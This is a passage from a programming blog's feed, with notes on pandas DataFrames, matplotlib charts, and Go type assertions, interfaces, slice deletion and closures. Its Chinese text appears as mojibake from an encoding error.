DataFrameä¸è¶³ä¸ºå¥‡ã€‚ä¸åŒä¹‹å¤„åœ¨äºï¼ŒSeriesæ˜¯å¯ä»¥æŒ‡å®šç´¢å¼•çš„ï¼Œé€šè¿‡æŒ‡å®šéƒ¨åˆ†ç´¢å¼•ä¸Šçš„å…ƒç´ ï¼Œå¯ä»¥å®ç°éƒ¨åˆ†æŒ‡å®šå…ƒç´ ï¼Œå…¶ä½™ä¸ºç¼ºå¤±å€¼ï¼Œä½†æ­¤æƒ…å†µåˆ›å»ºDataFrame æ—¶ï¼Œéœ€è¦æŒ‡å®š indexï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">In [19]: d = &#123;&quot;col1&quot;:[1, 2, 3,4], &quot;col2&quot;:pd.Series([10,11], index=[1, 3])&#125;</span><br><span class="line"></span><br><span class="line">In [20]: pd.DataFrame(d, index=[0, 1, 2, 3])</span><br><span class="line">Out[20]:</span><br><span class="line">   col1  col2</span><br><span class="line">0     1   NaN</span><br><span class="line">1     2  10.0</span><br><span class="line">2     3   NaN</span><br><span class="line">3     4  11.0</span><br></pre></td></tr></table></figure><h2 id="ç”±-numpy-ndarray-åˆ›å»º">ç”± numpy ndarray åˆ›å»º</h2><p>é€šè¿‡ ndarray åˆ›å»ºä¸é€šè¿‡å­—å…¸åˆ›å»ºçš„ DataFrame ä¸åŒä¹‹å¤„ï¼š</p><ol type="1"><li>å­—å…¸æ¯ä¸ªé”®å€¼å¯¹åº”çš„åˆ—è¡¨/Series æ˜¯ä¸€åˆ—ï¼Œè€Œ <strong>ndaarayäºŒç»´æ•°ç»„ï¼Œæ¯ä¸ªæ•°ç»„æ˜¯ä¸€è¡Œï¼Œæ•´ä¸ª DataFrame å’ŒäºŒç»´ ndarrayç»“æ„ä¸€è‡´ã€‚</strong>ã€‚</li><li>é€šè¿‡å­—å…¸åˆ›å»ºçš„ DataFrame å…·æœ‰ column labelsï¼Œä¸éœ€è¦æ‰‹åŠ¨èµ‹äºˆï¼Œè€Œnumpy çš„ ndarray ä¾¿æ˜¯ index /row labels å’Œ column labelsè‡ªåŠ¨ç”Ÿæˆï¼Œå› æ­¤å‡å¯ä»¥é€šè¿‡ <code>index</code> èµ‹äºˆç´¢å¼•/rowlabelsï¼Œä¹Ÿå¯ä»¥é€šè¿‡<code>columns</code> èµ‹äºˆ column labelsã€‚</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">In [22]: data = np.array([[1, 2, 3], [4, 5, 6], [7, 8, 9]])</span><br><span class="line"></span><br><span class="line">In [23]: df2 = pd.DataFrame(data, columns=[&quot;a&quot;, &quot;b&quot;, &quot;c&quot;])</span><br><span class="line"></span><br><span class="line">In [24]: df2</span><br><span class="line">Out[24]:</span><br><span class="line">   a  b  c</span><br><span class="line">0  1  2  3</span><br><span class="line">1  4  5  6</span><br><span class="line">2  7  8  9</span><br><span class="line"></span><br><span class="line">In [25]: df3 = pd.DataFrame(data, index=[&quot;a&quot;, &quot;b&quot;, &quot;c&quot;])</span><br><span class="line"></span><br><span class="line">In [26]: df3</span><br><span class="line">Out[26]:</span><br><span class="line">   0  1  2</span><br><span class="line">a  1  2  3</span><br><span class="line">b  4  5  6</span><br><span class="line">c  7  8  9</span><br></pre></td></tr></table></figure><h2 id="viewnig-data">viewnig Data</h2><ul><li><code>df.head(5)</code>ï¼šé»˜è®¤è¿”å›å‰äº”è¡Œ</li><li><code>df.tail(5)</code>ï¼šé»˜è®¤è¿”å›åäº”è¡Œ</li><li><code>df.index</code>ï¼šè¿”å›è¯¥ DataFrame çš„ç´¢å¼•</li><li><code>df.columns</code>ï¼šè¿”å›è¯¥ DataFrame çš„åˆ—</li><li><code>df.T</code>ï¼šè¿”å›è¯¥ DataFrame çš„è½¬ç½®</li><li><code>df.to_numpy()</code>ï¼šè¿”å›è¯¥ DataFrame çš„çŸ©é˜µè¡¨ç¤º</li><li><code>df.describe()</code>ï¼š è¿”å›è¯¥ DataFrame çš„æè¿°ä¸ç»Ÿè®¡ä¿¡æ¯</li></ul><h2 id="å‚è€ƒ">å‚è€ƒ</h2><ol type="1"><li><p><ahref="https://pandas.pydata.org/docs/reference/api/pandas.DataFrame.html">pandas.DataFrameâ€” pandas 1.4.2 documentation</a></p></li><li><p><ahref="https://www.kaggle.com/code/residentmario/creating-reading-and-writing">Creating,Reading and Writing | Kaggle</a></p></li><li><p><ahref="https://stackoverflow.com/questions/16923281/writing-a-pandas-dataframe-to-csv-file">python- Writing a pandas DataFrame to CSV file - Stack Overflow</a></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ml </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>matplotlib åº“ä¹‹æ•£ç‚¹å›¾ã€æŠ˜çº¿å›¾å’ŒæŸ±çŠ¶å›¾</title>
      <link href="/blog/2022/05/15/programming/python/ai/plot_graphs/"/>
      <url>/blog/2022/05/15/programming/python/ai/plot_graphs/</url>
      
        <content type="html"><![CDATA[<h1 id="matplotlib-åº“ä¹‹æ•£ç‚¹å›¾æŠ˜çº¿å›¾å’ŒæŸ±çŠ¶å›¾">matplotlibåº“ä¹‹æ•£ç‚¹å›¾ã€æŠ˜çº¿å›¾å’ŒæŸ±çŠ¶å›¾</h1><h2 id="æ•£ç‚¹å›¾">æ•£ç‚¹å›¾</h2><p>æ•£ç‚¹å›¾ï¼ˆScatterï¼‰ï¼šæ˜¯æ•°æ®ç‚¹åœ¨ç›´è§’åæ ‡ç³»ä¸­çš„åˆ†å¸ƒå›¾ï¼Œå®ƒå¯ä»¥ä¼ é€’ï¼š</p><ol type="1"><li>åŸå§‹æ•°æ®åˆ†å¸ƒçš„è§„å¾‹</li><li>æ•°æ®å˜åŒ–çš„è¶‹åŠ¿</li><li>æ•°æ®åˆ†ç»„æƒ…å†µ</li></ol><p><code>scatter()</code> å‡½æ•° scatter(x,y,scale,color,marker,label),å…¶ä¸­ xï¼Œy ä¸º python åˆ—è¡¨æˆ–è€… numpy æ•°ç»„ã€‚</p><table><thead><tr class="header"><th>å‚æ•°</th><th>è¯´æ˜</th><th>é»˜è®¤å€¼</th></tr></thead><tbody><tr class="odd"><td>X</td><td>æ•°æ®ç‚¹çš„ x åæ ‡</td><td>ä¸å¯çœç•¥</td></tr><tr class="even"><td>y</td><td>æ•°æ®ç‚¹çš„ y åæ ‡</td><td>ä¸å¯çœç•¥</td></tr><tr class="odd"><td>scale</td><td>æ•°æ®ç‚¹çš„å¤§å°</td><td>36</td></tr><tr class="even"><td>color</td><td>æ•°æ®ç‚¹çš„é¢œè‰²</td><td></td></tr><tr class="odd"><td>marker</td><td>æ•°æ®ç‚¹çš„æ ·å¼</td><td>'o'(åœ†ç‚¹)</td></tr><tr class="even"><td>label</td><td>å›¾ä¾‹æ–‡å­—</td><td></td></tr></tbody></table><p><code>text(x, y, s, fontsize, color)</code></p><table><thead><tr class="header"><th>å‚æ•°</th><th>è¯´æ˜</th><th>é»˜è®¤å€¼</th></tr></thead><tbody><tr class="odd"><td>x</td><td>æ–‡å­—çš„ x åæ ‡</td><td>ä¸å¯çœç•¥</td></tr><tr class="even"><td>y</td><td>æ–‡å­—çš„ y åæ ‡</td><td>ä¸å¯çœç•¥</td></tr><tr class="odd"><td>s</td><td>æ˜¾ç¤ºçš„æ–‡å­—</td><td>ä¸å¯çœç•¥</td></tr><tr class="even"><td>fontsize</td><td>æ–‡å­—çš„å¤§å°</td><td>12</td></tr><tr class="odd"><td>color</td><td>æ–‡å­—çš„é¢œè‰²</td><td>é»‘è‰²</td></tr></tbody></table><h2 id="åæ ‡è½´è®¾ç½®">åæ ‡è½´è®¾ç½®</h2><p>åæ ‡åŸç‚¹åœ¨ä¸­é—´ï¼Œä¸¤ä¸ªè½´ä¸Šéƒ½æœ‰æ­£çš„å’Œè´Ÿçš„éƒ¨åˆ†ï¼Œåœ¨è®¾ç½®å­—ä½“ä¸ºä¸­æ–‡å­—ä½“åï¼Œåæ ‡è½´ä¸Šçš„ç¬¦å·å¯èƒ½ä¼šå‡ºé”™ã€‚<code>plt.rcParams["axes.unicode_minus"] = False</code></p><table><thead><tr class="header"><th>å‡½æ•°</th><th>è¯´æ˜</th></tr></thead><tbody><tr class="odd"><td>xlabel(x, y, s, fontsize, color)</td><td>è®¾ç½® x è½´æ ‡ç­¾</td></tr><tr class="even"><td>ylabel( x, y, s, fontsize, color)</td><td>è®¾ç½® y è½´æ ‡ç­¾</td></tr><tr class="odd"><td>xlim(xmin, xmax)</td><td>è®¾ç½® x è½´åæ ‡çš„èŒƒå›´</td></tr><tr class="even"><td>ylim(ymin, ymax)</td><td>è®¾ç½® y è½´åæ ‡çš„èŒƒå›´</td></tr><tr class="odd"><td>tick params(labelsize)</td><td>è®¾ç½®åˆ»åº¦æ–‡å­—çš„å­—å·</td></tr></tbody></table><h2 id="å¢åŠ å›¾ä¾‹">å¢åŠ å›¾ä¾‹</h2><p>scatter(x, y, scale, color, marker, label) legend(loc, fontsize)</p><table><thead><tr class="header"><th>å–å€¼</th><th>å›¾ä¾‹ä½ç½®</th><th>å–å€¼</th><th>å›¾ä¾‹ä½ç½®</th></tr></thead><tbody><tr class="odd"><td>0</td><td>best</td><td>6</td><td>center left</td></tr><tr class="even"><td></td><td>upper right</td><td>7</td><td>center right</td></tr><tr class="odd"><td>2</td><td>upper left</td><td>8</td><td>lower center</td></tr><tr class="even"><td>3</td><td>lower left</td><td>9</td><td>upper center</td></tr><tr class="odd"><td>4</td><td>lower right</td><td>10</td><td>center</td></tr><tr class="even"><td>5</td><td>right</td><td></td><td></td></tr></tbody></table><h2 id="æŠ˜çº¿å›¾">æŠ˜çº¿å›¾</h2><p>æŠ˜çº¿å›¾ï¼ˆLine Chartï¼‰ï¼šæ•£ç‚¹å›¾çš„åŸºç¡€ä¸Šï¼Œå°†ç›¸é‚»çš„ç‚¹ç”¨çº¿æ®µç›¸è¿æ¥æè¿°å˜é‡å˜åŒ–çš„è¶‹åŠ¿</p><p>plot(x, y, color, marker, label, linewidth, markersize)</p><table><thead><tr class="header"><th>å‚æ•°</th><th>è¯´æ˜</th><th>é»˜è®¤å€¼</th></tr></thead><tbody><tr class="odd"><td>x</td><td>æ•°æ®ç‚¹çš„ x åæ ‡</td><td>0,1,2....</td></tr><tr class="even"><td>y</td><td>æ•°æ®ç‚¹çš„ y åæ ‡</td><td>ä¸å¯çœç•¥</td></tr><tr class="odd"><td>color</td><td>æ•°æ®ç‚¹çš„é¢œè‰²</td><td></td></tr><tr class="even"><td>marker</td><td>æ•°æ®ç‚¹çš„æ ·å¼</td><td>'o'(åœ†ç‚¹)</td></tr><tr class="odd"><td>label</td><td>å›¾ä¾‹æ–‡å­—</td><td></td></tr><tr class="even"><td>linewidth</td><td>æŠ˜çº¿çš„å®½åº¦</td><td></td></tr><tr class="odd"><td>markersize</td><td>æ•°æ®ç‚¹çš„å¤§å°</td><td></td></tr></tbody></table><p>ç³»ç»Ÿè‡ªåŠ¨åœ°ç»™å¤šæ¡æŠ˜çº¿è®¾ç½®ä¸åŒçš„é¢œè‰²ã€‚</p><h2 id="æŸ±çŠ¶å›¾">æŸ±çŠ¶å›¾</h2><p>æŸ±çŠ¶å›¾ (Bar Chart) ï¼šç”±ä¸€ç³»åˆ—é«˜åº¦ä¸ç­‰çš„æŸ±å½¢æ¡çº¹è¡¨ç¤ºæ•°æ®åˆ†å¸ƒçš„æƒ…å†µã€‚bar(left, height, width=0.8, facecolor, edgecolor, label)leftï¼šæ¯æŸ±çš„å·¦è¾¹çš„ x åæ ‡ heightï¼šæ¯æŸ±çš„é«˜åº¦ y åæ ‡</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Go æ–­è¨€</title>
      <link href="/blog/2022/03/26/programming/go/go_type_assertion/"/>
      <url>/blog/2022/03/26/programming/go/go_type_assertion/</url>
      
        <content type="html"><![CDATA[<ul><li>åªè¦å®ç°äº†æ¥å£çš„å…¨éƒ¨æ–¹æ³•è®¤ä¸ºè¿™ä¸ªç±»å‹å±äºæ¥å£ç±»å‹,å¦‚æœç¼–å†™ä¸€ä¸ªæ¥å£,è¿™ä¸ªæ¥å£ä¸­æ²¡æœ‰ä»»ä½•æ–¹æ³•,è¿™æ—¶è®¤ä¸ºæ‰€æœ‰ç±»å‹éƒ½å®ç°äº†è¿™ä¸ªæ¥å£.æ‰€ä»¥Go è¯­è¨€ä¸­<code>interface&#123;&#125;</code>ä»£è¡¨ä»»æ„ç±»å‹</li><li>å¦‚æœ<code>interface&#123;&#125;</code>ä½œä¸ºæ–¹æ³•å‚æ•°å°±å¯ä»¥æ¥æ”¶ä»»æ„ç±»å‹,ä½†æ˜¯åœ¨ç¨‹åºä¸­æœ‰æ—¶æœ‰éœ€è¦çŸ¥é“è¿™ä¸ªå‚æ•°åˆ°åº•æ˜¯ä»€ä¹ˆç±»å‹,è¿™ä¸ªæ—¶å€™å°±éœ€è¦ä½¿ç”¨æ–­è¨€</li><li>æ–­è¨€ä½¿ç”¨æ—¶ä½¿ç”¨ interface{}å˜é‡ç‚¹æ‹¬å·,æ‹¬å·ä¸­åˆ¤æ–­æ˜¯å¦å±äºçš„ç±»å‹</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">i <span class="keyword">interface</span>&#123;&#125;</span><br><span class="line">i.(Type)</span><br></pre></td></tr></table></figure><ul><li>æ–­è¨€çš„ä¸¤å¤§ä½œç”¨:<ul><li>åˆ¤æ–­æ˜¯å¦æ˜¯æŒ‡å®šç±»å‹</li><li>æŠŠ interface{}è½¬æ¢ä¸ºç‰¹å®šç±»å‹</li></ul></li></ul><h1 id="äºŒ.ä»£ç ç¤ºä¾‹">äºŒ.ä»£ç ç¤ºä¾‹</h1><ul><li>æ–­è¨€å¯ä»¥æœ‰ä¸€ä¸ªè¿”å›å€¼,å¦‚æœåˆ¤æ–­ç»“æœæ˜¯æŒ‡å®šç±»å‹è¿”å›å˜é‡å€¼,å¦‚æœä¸æ˜¯æŒ‡å®šç±»å‹æŠ¥é”™</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">demo</span><span class="params">(i <span class="keyword">interface</span>&#123;&#125;)</span></span>&#123;</span><br><span class="line">result:=i.(<span class="type">int</span>)</span><br><span class="line">fmt.Println(result)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">å‚æ•°æ˜¯456æ—¶,ç¨‹åºè¿è¡Œæ­£å¸¸,è¾“å‡º:</span></span><br><span class="line"><span class="comment">456</span></span><br><span class="line"><span class="comment">å‚æ•°æ˜¯falseæ—¶æŠ¥é”™ï¼š</span></span><br><span class="line"><span class="comment">panic: interface conversion: interface &#123;&#125; is bool, not int</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">demo(<span class="number">456</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>æ–­è¨€ä¹Ÿå¯ä»¥æœ‰ä¸¤ä¸ªè¿”å›å€¼,è¿™æ—¶æ— è®ºæ˜¯å¦æ˜¯æŒ‡å®šç±»å‹éƒ½ä¸æŠ¥é”™.<ul><li>ç¬¬ä¸€ä¸ªå‚æ•°:<ul><li>å¦‚æœæ­£ç¡®:è¿”å›å€¼å˜é‡å€¼</li><li>å¦‚æœé”™è¯¯:è¿”å›åˆ¤æ–­ç±»å‹çš„é»˜è®¤å€¼</li></ul></li><li>ç¬¬äºŒä¸ªå‚æ•°:<ul><li>è¿”å›å€¼ä¸º bool ç±»å‹,true è¡¨ç¤ºæ­£ç¡®,false è¡¨ç¤ºé”™è¯¯</li></ul></li></ul></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">demo</span><span class="params">(i <span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line">result, ok := i.(<span class="type">int</span>)</span><br><span class="line">fmt.Println(result, ok)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">å‚æ•°æ˜¯456æ—¶,ç¨‹åºè¿è¡Œæ­£å¸¸,è¾“å‡º:</span></span><br><span class="line"><span class="comment">456true</span></span><br><span class="line"><span class="comment">å‚æ•°æ˜¯å­—ç¬¦ä¸²&quot;abc&quot;æ—¶ç¨‹åºè¿è¡Œæ­£å¸¸,è¾“å‡º:</span></span><br><span class="line"><span class="comment">0 false</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">demo(<span class="string">&quot;abc&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vscode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Interface in Golang</title>
      <link href="/blog/2022/03/19/programming/go/Interface/"/>
      <url>/blog/2022/03/19/programming/go/Interface/</url>
      
        <content type="html"><![CDATA[<h1 id="interface">Interface</h1><h2 id="interface-values-with-nil-underlying-values">Interface valueswith nil underlying values</h2><p>If the concrete value inside the interface itself is nil, the methodwill be called with a nil receiver.</p><p>In some languages this would trigger a null pointer exception, but inGo it is common to write methods that gracefully handle being calledwith a nil receiver (as with the method M in this example.)</p><p>Note that an interface value that holds a nil concrete value isitself non-nil.</p><h2 id="nil-interface-values">Nil interface values</h2><p>A nil interface value holds neither value nor concrete type.</p><p>Calling a method on a nil interface is a run-time error because thereis no type inside the interface tuple to indicate which concrete methodto call.</p><h2 id="type-assertions">Type assertions</h2><p>A type assertion provides access to an interface value's underlyingconcrete value.</p><p>To test whether an interface value holds a specific type, a typeassertion can return two values: the underlying value and a booleanvalue that reports whether the assertion succeeded.</p><p>t, ok := i.(T) If i holds a T, then t will be the underlying valueand ok will be true.</p><p>If not, ok will be false and t will be the zero value of type T, andno panic occurs.</p><p>Note the similarity between this syntax and that of reading from amap.</p>]]></content>
      
      
      <categories>
          
          <category> go </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Go åˆ‡ç‰‡åˆ é™¤å…ƒç´ </title>
      <link href="/blog/2022/03/19/programming/go/go_slice/"/>
      <url>/blog/2022/03/19/programming/go/go_slice/</url>
      
        <content type="html"><![CDATA[<p>Goè¯­è¨€æ ‡å‡†åº“ä¸­æ²¡æœ‰æä¾›åˆ‡ç‰‡å…ƒç´ åˆ é™¤çš„å‡½æ•°ï¼Œå¯ä»¥åˆ©ç”¨åˆ‡ç‰‡ä¹Ÿå¯ä»¥å–å…¶ä¸­çš„ä¸€æ®µå½¢æˆå­åˆ‡ç‰‡çš„ç‰¹æ€§æ¥å®ç°åˆ é™¤æ•ˆæœã€‚</p><h2 id="åŸåˆ‡ç‰‡å†…å®¹ä¸å˜">åŸåˆ‡ç‰‡å†…å®¹ä¸å˜</h2><p>ä½¿ç”¨ copy å®Œæˆåˆ é™¤å…ƒç´ ï¼Œå¯ä»¥ä¿è¯åŸåˆ‡ç‰‡å†…å®¹ä¸å˜</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">num := []<span class="type">int</span>&#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;</span><br><span class="line">n := <span class="number">2</span></span><br><span class="line">newSlice := <span class="built_in">make</span>([]<span class="type">int</span>, n)</span><br><span class="line"><span class="built_in">copy</span>(newSlice, num[:n])</span><br><span class="line">newSlice = <span class="built_in">append</span>(newSlice, num[n+<span class="number">1</span>:]...)</span><br><span class="line">fmt.Printf(<span class="string">&quot;num:%p, newSlice:%p\n&quot;</span>, num, newSlice)</span><br><span class="line">fmt.Printf(<span class="string">&quot;num:%v, newSlice:%v\n&quot;</span>, num, newSlice)</span><br></pre></td></tr></table></figure><h2 id="åŸåˆ‡ç‰‡å†…å®¹æ”¹å˜">åŸåˆ‡ç‰‡å†…å®¹æ”¹å˜</h2><p>åŸå›  slice æ˜¯å¼•ç”¨ç±»å‹ï¼Œä¼ åœ°å€ã€‚appendå•çº¯å°†ç¬¬äºŒä¸ªå‚æ•°åœ°å€çš„å€¼å¤åˆ¶è¿æ¥åˆ°ç¬¬ä¸€ä¸ªå‚æ•°å°¾éƒ¨ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">num := []<span class="type">int</span> &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;</span><br><span class="line"><span class="comment">//è¦åˆ é™¤è„šæ ‡ä¸ºnçš„å…ƒç´ </span></span><br><span class="line">n:= <span class="number">2</span></span><br><span class="line">num1 :=num[<span class="number">0</span>:n]</span><br><span class="line">num1= <span class="built_in">append</span>(num1,num[n+<span class="number">1</span>:]...)</span><br><span class="line">fmt.Println(num1)</span><br></pre></td></tr></table></figure><p>æˆ–</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">num := []<span class="type">int</span> &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;</span><br><span class="line"><span class="comment">//è¦åˆ é™¤è„šæ ‡ä¸ºnçš„å…ƒç´ </span></span><br><span class="line">n:= <span class="number">2</span></span><br><span class="line">num1 :=<span class="built_in">append</span>(num[<span class="number">0</span>:n],num[n+<span class="number">1</span>:]...)</span><br><span class="line">fmt.Println(num1)</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼š ä¸èƒ½åœ¨è‡ªå·±çš„åˆ‡ç‰‡ä¸Šappendï¼Œå› ä¸ºåˆ‡ç‰‡æ˜¯å¼•ç”¨ï¼Œä¼šå¯¼è‡´åé¢çš„å¾€ç›¸åŒå†…å­˜ä¸Šè¿›è¡Œè¦†ç›–æ”¹å˜åŸåˆ‡ç‰‡çš„å€¼ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vscode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go é—­åŒ…</title>
      <link href="/blog/2022/03/16/programming/go/go_%20closure/"/>
      <url>/blog/2022/03/16/programming/go/go_%20closure/</url>
      
        <content type="html"><![CDATA[<ul><li>é—­åŒ…ä¸æ˜¯ Go è¯­è¨€ç‹¬æœ‰çš„æ¦‚å¿µ,åœ¨å¾ˆå¤šç¼–ç¨‹è¯­è¨€ä¸­éƒ½æœ‰é—­åŒ…</li><li>é—­åŒ…å°±æ˜¯è§£å†³å±€éƒ¨å˜é‡ä¸èƒ½è¢«å¤–éƒ¨è®¿é—®ä¸€ç§è§£å†³æ–¹æ¡ˆ</li><li>æ˜¯æŠŠå‡½æ•°å½“ä½œè¿”å›å€¼çš„ä¸€ç§åº”ç”¨</li></ul><h2 id="äºŒ.ä»£ç æ¼”ç¤º">äºŒ.ä»£ç æ¼”ç¤º</h2><ul><li>æ€»ä½“æ€æƒ³ä¸º:åœ¨å‡½æ•°å†…éƒ¨å®šä¹‰å±€éƒ¨å˜é‡,æŠŠå¦ä¸€ä¸ªå‡½æ•°å½“ä½œè¿”å›å€¼,å±€éƒ¨å˜é‡å¯¹äºè¿”å›å€¼å‡½æ•°å°±ç›¸å½“äºå…¨å±€å˜é‡,æ‰€ä»¥å¤šæ¬¡è°ƒç”¨è¿”å›å€¼å‡½æ•°å±€éƒ¨å˜é‡çš„å€¼è·Ÿéšå˜åŒ–</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import &quot;fmt&quot;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">//reså…¶å®å°±æ˜¯test1è¿”å›å€¼å‡½æ•°,å’Œä¹‹å‰åŒ¿åå‡½æ•°å˜é‡ä¸€ä¸ªé“ç†</span><br><span class="line">res := test1()</span><br><span class="line">fmt.Println(res()) //è¾“å‡º2</span><br><span class="line">fmt.Println(res()) //è¾“å‡º3</span><br><span class="line">fmt.Println(res()) //è¾“å‡º4</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//æ³¨æ„æ­¤å¤„,è¿”å›å€¼ç±»å‹æ˜¯func int</span><br><span class="line">func test1() func() int &#123;</span><br><span class="line">i := 1</span><br><span class="line">return func() int &#123;</span><br><span class="line">i = i + 1</span><br><span class="line">return i</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>å¦‚æœé‡æ–°è°ƒç”¨ test1()ä¼šé‡æ–°å£°æ˜åŠèµ‹å€¼å±€éƒ¨å˜é‡ i</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import &quot;fmt&quot;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">f := test1()</span><br><span class="line">fmt.Println(&quot;fçš„åœ°å€&quot;, f) //è¾“å‡ºåŒ¿åå‡½æ•°åœ°å€</span><br><span class="line">fmt.Println(&quot;f:&quot;, f()) //è°ƒç”¨åŒ¿åå‡½æ•°è¾“å‡º2</span><br><span class="line">fmt.Println(&quot;f:&quot;, f()) //è°ƒç”¨åŒ¿åå‡½æ•°è¾“å‡º3</span><br><span class="line">k := test1()</span><br><span class="line">fmt.Println(&quot;kçš„åœ°å€&quot;, k) //è¾“å‡ºåŒ¿åå‡½æ•°åœ°å€,ä¸fç›¸ç­‰</span><br><span class="line">fmt.Println(&quot;k:&quot;, k()) //è°ƒç”¨åŒ¿åå‡½æ•°è¾“å‡º2</span><br><span class="line">fmt.Println(&quot;f:&quot;, f()) //è¾“å‡º:4</span><br><span class="line">fmt.Println(&quot;k:&quot;, k()) //è¾“å‡º:3</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func test1() func() int &#123;</span><br><span class="line">i := 1</span><br><span class="line">return func() int &#123;</span><br><span class="line">i++</span><br><span class="line">// æ¯è°ƒç”¨ä¸€æ¬¡test1()è¾“å‡ºçš„åœ°å€ä¸ä¸€æ ·</span><br><span class="line">fmt.Println(&quot;içš„åœ°å€:&quot;, &amp;i)</span><br><span class="line">return i</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span 